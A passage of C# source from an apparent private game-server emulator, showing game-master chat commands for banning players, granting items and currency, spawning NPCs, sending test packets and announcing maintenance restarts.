                            uint UID = 0;
                            WindowsAPI.IniFile ini = new WindowsAPI.IniFile("");
                            foreach (string fname in System.IO.Directory.GetFiles(Program.ServerConfig.DbLocation + "\\Users\\"))
                            {
                                ini.FileName = fname;

                                string RName = ini.ReadString("Character", "Name", "None");
                                if (RName.GetHashCode() == Name.GetHashCode())
                                {
                                    UID = ini.ReadUInt32("Character", "UID", 0);
                                    break;
                                }

                            }
                            try
                            {
                                int add = int.Parse(data[2]);
                                Time = DateTime.Now.AddMinutes(add);
                            }
                            catch
                            {
                                if (data[2] == "Permemnat")
                                {
                                    Permenant = true;
                                }
                            }
                            Client.GameClient clienttoban = null;
                            if (Database.Server.GamePoll.TryGetValue(UID, out clienttoban))
                            {
                                if (!Permenant)
                                {
                                    clienttoban.Player.BannedChatStamp = Time;
                                }
                                else
                                {
                                    clienttoban.Player.PermenantBannedChat = Permenant;
                                }
                                clienttoban.Player.IsBannedChat = true;
                            }
                            else
                            {
                                WindowsAPI.IniFile write = new WindowsAPI.IniFile("\\Users\\" + UID + ".ini");
                                write.Write<bool>("Character", "IsBannedChat", true);
                                if (!Permenant)
                                {
                                    write.Write<long>("Character", "BannedChatStamp", Time.ToBinary());
                                }
                                else
                                {
                                    write.Write<bool>("Character", "PermenantBannedChat", Permenant);
                                }
                            }
                            break;
                        }
                    case "realmpoker":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MsgTexasExMatchFieldList.TexasMatchInfo Match = new MsgTexasExMatchFieldList.TexasMatchInfo() { ID = 1001, PlayersCount = 30 };
                                client.Send(stream.CreateTexasMatchInfo(Match));
                            }
                            break;
                        }
                    case "pack":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                byte[] dataff = new byte[]
                            {
                                0x00 ,0x00 ,0xE3 ,0xDC ,0x4C ,0x00 ,0xA5 ,0xDB ,0x01 ,0x00 ,0xEB ,0xEE ,0x00 ,0x00 ,0x04 ,0x00 ,0x00 ,0x00 ,0x01 ,0xED ,0x75 ,0x00 ,0x00 ,0x0C ,0xF8 ,0x00 ,0x00 ,0xC7 ,0x9C ,0x00 ,0x00 ,0xC8 ,0x18 ,0x01 ,0x00 ,0x02 ,0xC6 ,0xC3 ,0x00 ,0x00 ,0x69 ,0xF5 ,0x00 ,0x00 ,0x6E ,0x18 ,0x01 ,0x00 ,0xDA ,0x9C ,0x00 ,0x00 ,0x03 ,0xB4 ,0x75 ,0x00 ,0x00 ,0xD8 ,0x27 ,0x00 ,0x00 ,0xFF ,0xF5 ,0x00 ,0x00 ,0x8C ,0x18 ,0x01 ,0x00 ,0x04 ,0x01 ,0xC4 ,0x00 ,0x00 ,0x0C ,0xF8 ,0x00 ,0x00 ,0xDC ,0x9C ,0x00 ,0x00 ,0x50 ,0x18 ,0x01 ,0x00
                            };
                                stream.InitWriter();
                                for (int x = 0; x < dataff.Length; x++)
                                {
                                    stream.Write((byte)dataff[x]);
                                }
                                stream.Finalize(2534);
                                client.Send(stream);
                            }
                            break;
                        }
                    case "cunion":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.MyUnion = Role.Instance.Union.Create(stream, client, data[1]);
                                client.Player.MyUnion.AddGuild(stream, client.Player.MyGuild);
                            }
                            break;
                        }
                    case "ttp":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                byte[] dataff = new byte[]
                            {
                               0x08 ,0x00 ,0x10 ,0x89 ,0xCD ,0x8C ,0x01 ,0x18 ,0x07 ,0x20 ,0x00 ,0x28
,0x01 ,0x30 ,0x1D ,0x3A ,0x08 ,0x48 ,0x70 ,0x6F ,0x70
                            };
                                stream.InitWriter();
                                for (int x = 0; x < dataff.Length; x++)
                                {
                                    stream.Write((byte)dataff[x]);
                                }

                                stream.Finalize(2311);
                                MsgLeagueMainRank.MsgUnionRank te;
                                stream.GetLeagueMainRank(out te);

                            }
                            break;
                        }
                    case "mm":
                        {
                            byte[] dat = new byte[]
                            {
                                0x08 ,0xF8 ,0x85 ,0x07 ,0xFF ,0xFF ,0xFF ,0xFF ,0x62 ,0x09 ,0x00 ,0x00  
,0xE0 ,0x07 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x37 ,0x00 ,0x36 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
,0x01 ,0x00 ,0x07 ,0x07 ,0x53 ,0x74 ,0x69 ,0x6E ,0x67 ,0x65 ,0x72 ,0x09 ,0x69 ,0x4C ,0x6F ,0x6C
,0x6C ,0x69 ,0x70 ,0x6F ,0x70 ,0x00 ,0x0B ,0x3A ,0x29 ,0x20 ,0x61 ,0x74 ,0x20 ,0x73 ,0x70 ,0x6F
,0x74 ,0x3F ,0x00 ,0x00 ,0x04 ,0x46 ,0x69 ,0x72 ,0x65 ,0x00
                            };
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.InitWriter();
                                for (int x = 0; x < dat.Length; x++)
                                    stream.Write((byte)dat[x]);
                                stream.Finalize(1004);
                                var tt = new MsgMessage();
                                tt.Deserialize(stream);
                                stream = tt.GetArray(stream);
                                MsgInterServer.StaticConnexion.Send(stream);

                                stream.InitWriter();
                                for (int x = 0; x < dat.Length; x++)
                                    stream.Write((byte)dat[x]);

                                stream.Finalize(1004);
                                MsgInterServer.StaticConnexion.Send(stream);

                            }
                            break;
                        }
                    case "addguiitem":
                        {

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var apacket = rec.GetStream();
                                client.Inventory.AddReturnedItem(apacket, uint.Parse(data[1]), byte.Parse(data[2]));
                            }

                            break;
                        }
                    case "skdmg":
                        {
                            ushort ID = 0;
                            byte Value = 0;
                            if (ushort.TryParse(data[1], out ID))
                            {
                                if (ushort.MaxValue < ID)
                                {
                                    client.SendSysMesage("Skill id must be lower than +" + ushort.MaxValue);
                                    break;
                                }
                            }
                            else
                                break;
                            if (byte.TryParse(data[2], out Value))
                            {
                                if (byte.MaxValue < Value)
                                {
                                    client.SendSysMesage("Skill value must be lower than +" + byte.MaxValue);
                                    break;
                                }
                            }
                            else
                                break;
                            Database.AttackCompatetor.Insert(ID, Value);
                            client.SendSysMesage("Skill Inserted Successfully.");
                            break;
                        }
                    case "addgui":
                        {
                            ActionQuery action = new ActionQuery()
                            {
                                Type = ActionType.OpenDialog,
                                dwParam2 = 100,
                                dwParam3 = 10000,
                                dwParam4 = 1000,
                                ObjId = client.Player.UID,
                                dwParam = uint.Parse(data[1]),//MsgServer.DialogCommands.JiangHuSetName,
                                wParam1 = client.Player.X,
                                wParam2 = client.Player.Y
                            };
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var apacket = rec.GetStream();
                                client.Send(apacket.ActionCreate(&action));
                            }
                            break;
                        }
                    case "ali":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                client.Send(stream.GuildRequestCreate((MsgGuildProces.GuildAction)ushort.Parse(data[1]), client.Player.UID, new int[3], "Basta"));
                            }
                            break;
                        }
                    case "bc":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage(data[1], "ALLUSERS", MsgColor.red, ChatMode.BroadcastMessage).GetArray(stream));
                            }
                            break;
                        }
                    case "kingdom":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.MyUnion.UpdateToKingdom(stream);
                            }
                            break;
                        }
                    case "munion":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.MyUnion.UpdateToUnion(stream);
                            }
                            break;
                        }
                    case "union":
                        {


                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Send(stream.LeagueOptCreate((MsgLeagueOpt.ActionID)ushort.Parse(data[1]), 10, 100, 1, ""));
                            }
                            break;
                        }
                    case "inv":
                    case "invisible":
                        {
                            client.Player.Invisible = true;
                            break;
                        }
                    case "invinv":
                    case "visible":
                        {
                            client.Player.Invisible = false;
                            break;
                        }
                    case "claimcp":
                        {
                            client.Player.ChargCps = uint.Parse(data[1]);
                            break;
                        }
                    case "battlepoints":
                        {
                            client.Player.BattleFieldPoints = ushort.Parse(data[1]);
                            break;
                        }
                    case "tour":
                        {
                            Game.MsgTournaments.MsgSchedules.CurrentTournament = Game.MsgTournaments.MsgSchedules.Tournaments[(MsgTournaments.TournamentType)ushort.Parse(data[1])];
                            Game.MsgTournaments.MsgSchedules.CurrentTournament.Open();
                            break;
                        }
                    case "hit":
                        {
                            client.Player.HitPoints = ushort.Parse(data[1]);
                            client.Player.SendUpdateHP();
                            break;

                        }
                    case "dd":
                        {
                            byte[] buf = new byte[]
                            {
                            0x92 ,0xAE, 0x6D, 0x00,    0xCD ,0xFF,0x0A,0x00,0x01,0x00,0x01,0x00
,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                            };
                            /*67 E0 A9 00 37 2D 13 00 0C 00 00 00      ;* 'gà© 7-    
00 00 00 00 00 00 00 00 AB 00 07 00 BD 01 4D 00      ;        «  ½M 
00 00 00 00 00 00 00 00 00 00*/
                            ActionQuery action = new ActionQuery()
                            {
                                ObjId = client.Player.UID,
                                Type = (ActionType)0xab,
                                Fascing = 7,
                                wParam1 = client.Player.X,
                                wParam2 = client.Player.Y,
                                dwParam = 0x0c,
                                PacketStamp = 0

                            };

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                unsafe
                                {
                                    client.Send(stream.ActionCreate(&action));
                                }

                                /*stream.InitWriter();
                                for (int x = 0; x < buf.Length; x++)
                                    stream.Write((byte)buf[x]);
                                stream.Finalize(1008);
                                client.Send(stream);*/
                            }
                            break;
                        }
                    case "jjj":
                        {
                            /*  *((ushort*)(ptr)) = 38;
                *((ushort*)(ptr + 2)) = 1070;
                *((ushort*)(ptr + 4)) = 1;*/

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.InitWriter();
                                stream.Write(ushort.Parse(data[1]));
                                stream.Write((ulong)0);//ushort.MaxValue);//ushort.Parse(data[2]));
                                stream.Write((ulong)1000);
                                stream.Write("PoP");
                                stream.Finalize(1070);
                                client.Send(stream);
                            }
                            break;
                        }
                    case "reward":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                client.Player.DailySignUpDays |= (1ul << byte.Parse(data[1]));
                                // client.Send(stream.MsgSignInCreate((MsgSignIn.ActionID)byte.Parse(data[1]), byte.Parse(data[2])
                                //     , byte.Parse(data[3]), (1ul << byte.Parse(data[4]))));


                            }
                            break;
                        }
                    case "teffect":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Send(stream.MsgRefineEffectCreate(new MsgRefineEffect.RefineEffectProto()
                                {
                                    Effect = (MsgRefineEffect.RefineEffects)uint.Parse(data[1]),
                                    Id = client.Player.UID,
                                    dwParam = (uint)client.Player.UID//(int)uint.Parse(data[2])

                                }));
                            }
                            break;
                        }
                    case "name":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                ActionQuery action = new ActionQuery()
                                {
                                    Type = ActionType.OpenDialog,
                                    ObjId = client.Player.UID,
                                    dwParam = MsgServer.DialogCommands.ChangeName,
                                    wParam1 = client.Player.X,
                                    wParam2 = client.Player.Y,

                                };
                                client.Send(stream.ActionCreate(&action));
                            }
                            break;
                        }
                    case "clearspells":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                foreach (var spell in client.MySpells.ClientSpells.Values)
                                    client.MySpells.Remove(spell.ID, stream);
                            }
                            break;
                        }
                    case "incquest":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.QuestGUI.IncreaseQuestObjectives(stream, ushort.Parse(data[1]), ushort.Parse(data[2]), ushort.Parse(data[3]), ushort.Parse(data[4]));
                            }
                            break;
                        }
                    case "accquest":
                        {

                            client.Player.QuestGUI.Accept(Database.QuestInfo.AllQuests[uint.Parse(data[1])], 0);
                            break;
                        }
                    case "remquest":
                        {
                            client.Player.QuestGUI.AcceptedQuests.Remove(uint.Parse(data[1]));
                            client.Player.QuestGUI.src.Remove(uint.Parse(data[1]));
                            break;
                        }
                    case "finishquest":
                        {
                            client.Player.QuestGUI.FinishQuest(uint.Parse(data[1]));
                            break;
                        }
                    case "rr":
                        {
                            client.Player.TCCaptainTimes = 0;
                            break;
                        }
                    case "cards":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.InitWriter();
                                stream.Write((ushort)7);
                                stream.Write((ushort)4);
                                stream.ZeroFill(22);
                                stream.Write((ushort)1);
                                stream.Write(client.Player.UID);//starter or dealer?
                                stream.Write(0);
                                stream.Write(0);//??

                                stream.Write(ushort.Parse(data[1]));
                                stream.Write((ushort)1);
                                stream.Write(client.Player.UID);


                                stream.Finalize(GamePackets.PokerDrawCards);
                                client.Send(stream);
                            }
                            break;
                        }
                    case "tett":
                        {
                            //using (var rec = new ServerSockets.RecycledPacket())
                            //{
                            //    var stream = rec.GetStream();
                            //    client.Send(stream.PokerPlayerTurnCreate(byte.Parse(data[1]), 0, 0, 0, 0));
                            //}
                            break;
                        }

                    case "trans":
                        {

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                //client.Player.Body = x;//ushort.Parse(data[1]);
                                // client.Player.SendUpdate(stream, client.Player.Mesh, MsgUpdate.DataType.Mesh);
                                client.Player.TransformInfo = new Role.ClientTransform(client.Player);
                                client.Player.TransformInfo.CreateTransform(stream, 817, ushort.Parse(data[1]), (int)ushort.MaxValue - 1, 8213);
                            }


                            break;
                        }
                    case "pick":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.AddPick(stream, "Pick", 5);
                            }
                            break;
                        }
                    case "ag":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage("" + client.Player.Name + " successfully acquired [Universal~Concept~(A)], getting closer to be a super hero! [Link Go acquire ###1 692]", MsgMessage.MsgColor.red, MsgMessage.ChatMode.InnerPower).GetArray(stream));
                            }
                            break;
                        }
                    case "addnpc":
                        {
                            Game.MsgNpc.Npc np = Game.MsgNpc.Npc.Create();
                            np.UID = (uint)Program.GetRandom.Next(10000, 100000);
                            np.NpcType = (Role.Flags.NpcType)byte.Parse(data[1]);
                            np.Mesh = ushort.Parse(data[2]);
                            np.Map = client.Player.Map;//ushort.Parse(data[3]);
                            np.X = client.Player.X;//ushort.Parse(data[4]);
                            np.Y = client.Player.Y;//ushort.Parse(data[5]);
                            client.Map.AddNpc(np);
                            break;
                        }
                    case "addflagnpc":
                        {
                            Game.MsgNpc.Npc np = Game.MsgNpc.Npc.Create();
                            np.UID = uint.Parse(data[1]);
                            np.NpcType = (Role.Flags.NpcType)byte.Parse(data[2]);
                            np.Mesh = ushort.Parse(data[3]);
                            np.Map = client.Player.Map;//ushort.Parse(data[3]);
                            np.X = client.Player.X;//ushort.Parse(data[4]);
                            np.Y = client.Player.Y;//ushort.Parse(data[5]);
                            client.Map.AddNpc(np);
                            break;
                        }
                    case "itemeffect":
                        {
                            MsgGameItem item;
                            if (client.Equipment.TryGetEquip(Role.Flags.ConquerItem.RightWeapon, out item))
                            {
                                item.Effect = (Role.Flags.ItemEffect)ushort.Parse(data[1]);
                                item.Mode = Role.Flags.ItemMode.Update;
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    item.Send(client, stream);
                                }
                            }
                            break;
                        }
                    case "str"://swordcaromstart
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendString(stream, MsgStringPacket.StringID.Effect, false, "bagua-5");
                            }
                            break;
                        }
                    case "dura":
                        {
                            MsgServer.MsgGameItem GameItem;
                            if (client.Equipment.TryGetEquip((Role.Flags.ConquerItem)byte.Parse(data[1]), out GameItem))
                            {
                                GameItem.Durability = GameItem.MaximDurability = ushort.Parse(data[2]);

                                GameItem.Mode = Role.Flags.ItemMode.Update;
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    GameItem.Send(client, stream);
                                }
                            }
                            break;
                        }
                    case "activitypoints":
                        {
                            client.Activeness.ActivityPoints = uint.Parse(data[1]);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                // client.Activeness.UpdateTasksList(stream);
                                client.Activeness.UpdateActivityPoints(stream);

                            }
                            break;
                        }
                    case "testct":
                        {
                            uint Count = ushort.Parse(data[1]);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.CaptureTheFlagRankingsCreate((MsgCaptureTheFlagRankings.ActionID)0, 0, 2, Count, 4, 5);
                                for (int x = 0; x < Count; x++)
                                {

                                    stream.AddItemCaptureTheFlagRankings(100, 200, "basta" + x.ToString(), (uint)(100 + x));
                                }
                                stream.CaptureTheFlagRankingsFinalize();
                                client.Send(stream);
                            }

                            break;
                        }
                    case "realbp":
                        {
                            client.SendSysMesage("You real BatterPower is = " + client.Player.RealBattlePower + "");
                            break;
                        }
                    case "bp":
                        {
                            client.SendSysMesage("You BatterPower is = " + client.Player.BattlePower + "");
                            break;
                        }
                    case "superman":
                        {
                            client.Player.Vitality += 500;
                            client.Player.Strength += 500;
                            client.Player.Spirit += 500;
                            client.Player.Agility += 500;

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendUpdate(stream, client.Player.Strength, Game.MsgServer.MsgUpdate.DataType.Strength);
                                client.Player.SendUpdate(stream, client.Player.Agility, Game.MsgServer.MsgUpdate.DataType.Agility);
                                client.Player.SendUpdate(stream, client.Player.Spirit, Game.MsgServer.MsgUpdate.DataType.Spirit);
                                client.Player.SendUpdate(stream, client.Player.Vitality, Game.MsgServer.MsgUpdate.DataType.Vitality);

                            }
                            break;
                        }
                    case "resetstats":
                        {
                            client.Player.Vitality = 0;
                            client.Player.Strength = 0;
                            client.Player.Spirit = 0;
                            client.Player.Agility = 0;

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendUpdate(stream, client.Player.Strength, Game.MsgServer.MsgUpdate.DataType.Strength);
                                client.Player.SendUpdate(stream, client.Player.Agility, Game.MsgServer.MsgUpdate.DataType.Agility);
                                client.Player.SendUpdate(stream, client.Player.Spirit, Game.MsgServer.MsgUpdate.DataType.Spirit);
                                client.Player.SendUpdate(stream, client.Player.Vitality, Game.MsgServer.MsgUpdate.DataType.Vitality);

                            }
                            break;
                        }
                    case "battlefieldon":
                        {
                            MsgTournaments.MsgSchedules.Tournaments[MsgTournaments.TournamentType.BattleField].Open();
                            break;
                        }
                    case "addmem":
                        {
                            for (int x = 0; x < ushort.Parse(data[1]); x++)
                            {
                                client.Player.MyGuild.Members.TryAdd((uint)(client.Player.UID + x + 1000)
                                    , new Role.Instance.Guild.Member() { Name = "test " + x.ToString() + " ", Class = 15, Level = (byte)x, IsOnline = true, UID = (uint)(client.Player.UID + x + 1000) });
                            }
                            break;
                        }
                    case "flags":
                        {
                            client.Player.ClearFlags();
                            break;
                        }
                    case "SendUpdate":
                        {
                            using (var rect = new ServerSockets.RecycledPacket())
                            {
                                var stream = rect.GetStream();
                                client.Player.View.SendView(client.Player.GetArray(stream, false), true);
                            }

                            break;
                        }
                    case "addflags":
                        {
                            client.Player.AddFlag(MsgUpdate.Flags.Freeze, Role.StatusFlagsBigVector32.PermanentFlag, true);

                            break;
                        }
                    case "give":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {

                                    switch (data[2])
                                    {
                                        
                                        case "item3":
                                        case "itemds":
                                            {
                                                using (var rec = new ServerSockets.RecycledPacket())
                                                {
                                                    var stream = rec.GetStream();
                                                    user.Inventory.Add(stream, uint.Parse(data[3]), byte.Parse(data[4]));
                                                }
                                                break;
                                            }
                                        case "claimcp":
                                            {
                                                user.Player.ChargCps = uint.Parse(data[3]);
                                                user.Player.RechargePoints += uint.Parse(data[3]);
                                                break;
                                            }
                                        //case "vip":
                                        //    {
                                        //        foreach (var user in Database.Server.GamePoll.Values)
                                        //        {
                                        //            if (user.Player.Name.ToLower() == data[1].ToLower())
                                        //            {

                                        //                if (DateTime.Now > user.Player.ExpireVip)
                                        //                    user.Player.ExpireVip = DateTime.Now.AddDays(30);
                                        //                else
                                        //                    user.Player.ExpireVip = user.Player.ExpireVip.AddDays(30);

                                        //                user.Player.VipLevel = (byte)uint.Parse(data[2]);
                                        //                using (var rec = new ServerSockets.RecycledPacket())
                                        //                {
                                        //                    var stream = rec.GetStream();
                                        //                    user.Player.SendUpdate(stream, user.Player.VipLevel, MsgUpdate.DataType.VIPLevel);

                                        //                    user.Player.UpdateVip(stream);
                                        //                }
                                        //                user.CreateBoxDialog("You`ve received vip6 (30 days) . Thank for you donation.");

                                        //                break;
                                        //            }
                                        //        }
                                        //        break;
                                        //    }
                                        case "innerpotency":
                                            {
                                                int amount = 0;
                                                if (int.TryParse(data[3], out amount))
                                                {
                                                    using (var rec = new ServerSockets.RecycledPacket())
                                                    {
                                                        var stream = rec.GetStream();
                                                        user.Player.InnerPower.AddPotency(stream, user, amount);
                                                        user.CreateBoxDialog("You receive " + amount + " InnerPower Potency.");
                                                    }
                                                }
                                                break;
                                            }
                                        case "level":
                                            {
                                                byte amount = 0;
                                                if (byte.TryParse(data[3], out amount))
                                                {
                                                    using (var rec = new ServerSockets.RecycledPacket())
                                                    {
                                                        var stream = rec.GetStream();
                                                        user.UpdateLevel(stream, amount, true);
                                                    }
                                                }
                                                break;
                                            }
                                        case "money":
                                            {
                                                user.Player.Money += long.Parse(data[3]); using (var rec = new ServerSockets.RecycledPacket())
                                                {
                                                    var stream = rec.GetStream();
                                                    user.Player.SendUpdate(stream, user.Player.Money, MsgUpdate.DataType.Money);
                                                }
                                                break;
                                            }
                                        case "cps":
                                            {
                                                user.Player.ConquerPoints += uint.Parse(data[3]);

                                                break;
                                            }
                                        case "rpts":
                                            {
                                                using (var rec = new ServerSockets.RecycledPacket())
                                                {
                                                    var stream = rec.GetStream();
                                                    user.Player.RacePoints += uint.Parse(data[3]);
                                                    user.Player.SendUpdate(stream, user.Player.RacePoints, MsgUpdate.DataType.RaceShopPoints);
                                                }
                                                break;
                                            }
                                        case "item":
                                            {
                                                uint ID = 0;
                                                if (!uint.TryParse(data[3], out ID))
                                                {
                                                    client.SendSysMesage("Invlid item ID !");
                                                    break;
                                                }
                                                byte plus = 0;
                                                if (!byte.TryParse(data[4], out plus))
                                                {
                                                    client.SendSysMesage("Invlid item plus !");
                                                    break;
                                                }
                                                byte bless = 0;
                                                if (!byte.TryParse(data[5], out bless))
                                                {
                                                    client.SendSysMesage("Invlid item Enchant !");
                                                    break;
                                                }
                                                byte enchant = 0;
                                                if (!byte.TryParse(data[6], out enchant))
                                                {
                                                    client.SendSysMesage("Invlid item Enchant !");
                                                    break;
                                                }
                                                byte sockone = 0;
                                                if (!byte.TryParse(data[7], out sockone))
                                                {
                                                    client.SendSysMesage("Invlid item Socket One !");
                                                    break;
                                                }
                                                byte socktwo = 0;
                                                if (!byte.TryParse(data[8], out socktwo))
                                                {
                                                    client.SendSysMesage("Invlid item Socket Two !");
                                                    break;
                                                }
                                                byte count = 1;
                                                if (data.Length > 9)
                                                {
                                                    if (!byte.TryParse(data[9], out count))
                                                    {
                                                        client.SendSysMesage("Invlid item count !");
                                                        break;
                                                    }
                                                }
                                                byte Effect = 0;
                                                if (data.Length > 10)
                                                {
                                                    if (!byte.TryParse(data[10], out Effect))
                                                    {
                                                        client.SendSysMesage("Invlid Effect Type !");
                                                        break;
                                                    }
                                                }
                                                using (var rec = new ServerSockets.RecycledPacket())
                                                    user.Inventory.Add(rec.GetStream(), ID, count, plus, bless, enchant, (Role.Flags.Gem)sockone, (Role.Flags.Gem)socktwo, false, (Role.Flags.ItemEffect)Effect);

                                                break;
                                            }

                                    }
                                    break;
                                }
                            }
                            break;
                        }
                    case "unbanstr":
                        {
                            Database.SystemBannedAccount.RemoveBan(data[1]);
                            break;
                        }
                    case "unbanuid":
                        {
                            Database.SystemBannedAccount.RemoveBan(uint.Parse(data[1]));
                            break;
                        }
                    case "ban":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {

                                    Database.SystemBannedAccount.AddBan(user.Player.UID, user.Player.Name, uint.Parse(data[2]));
                                    user.SendSysMesage("You Account was Banned by [PM]/[GM].", ChatMode.System, MsgColor.white);
                                    user.Socket.Disconnect();
                                    break;
                                }
                            }
                            break;
                        }
                    case "banip":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    Database.SystemBanned.AddBan(user.Socket.RemoteIp, uint.Parse(data[2]));
                                    user.SendSysMesage("You Ip Address was Banned by [PM]/[GM].", ChatMode.System, MsgColor.white);
                                    user.Socket.Disconnect();
                                    break;
                                }
                            }
                            break;
                        }
                    case "exploits":
                        {
                            client.Player.KingDomExploits = uint.Parse(data[1]);
                            break;
                        }
                    case "bigrestart":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                Program.OnMainternance = true;
                                Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage("The server will be brought down for maintenance in (5 Minutes). Please log off immediately to avoid data loss.", "ALLUSERS", MsgColor.red, ChatMode.Center).GetArray(stream));

#if Arabic
                  MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 5minute0second. Please exitthe game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
              
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (5 Minutes). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (4 Minutes & 30 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                  MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 4minute30second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
               
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (4 Minutes & 30 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (4 Minutes & 00 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                  MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 4minute0second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
              
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (4 Minutes & 00 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (3 Minutes & 30 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                       MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 3minute30second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
         
#else
